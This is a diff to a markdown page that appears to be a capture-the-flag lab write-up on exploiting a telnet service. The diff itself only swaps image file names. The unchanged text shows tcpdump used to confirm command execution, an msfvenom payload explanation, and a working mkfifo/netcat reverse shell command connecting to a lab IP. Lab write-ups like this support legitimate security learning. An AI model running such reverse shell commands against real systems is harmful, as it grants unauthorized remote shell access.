@@ -8,9 +8,9 @@ with the OpenVPN connection:
 
 * `sudo tcpdump ip proto \\icmp -i tun0`
 
-<figure><img src="../../.gitbook/assets/image (65).png" alt=""><figcaption><p>why tun0</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (76).png" alt=""><figcaption><p>why tun0</p></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>
 
 in order to find if telnet is executing our commands on it we started a tcpdump listener on our local machine and then executed `.RUN ping [our local ip] -c 1`
 
@@ -29,7 +29,7 @@ We're going to generate a reverse shell payload using msfvenom.This will generat
 
 `R` = export the payload in raw format
 
-<figure><img src="../../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>
 
 #### Now all we need to do is start a netcat listener on our local machine. We do this using:
 
@@ -39,5 +39,5 @@ after that we copy and paste our msfvenom payload into the telnet session and ru
 
 `.RUN mkfifo /tmp/qdym; nc 10.13.65.129 44444 0</tmp/qdym | /bin/sh >/tmp/qdym 2>&1; rm /tmp/qdym` was run in the telnet session, then:
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
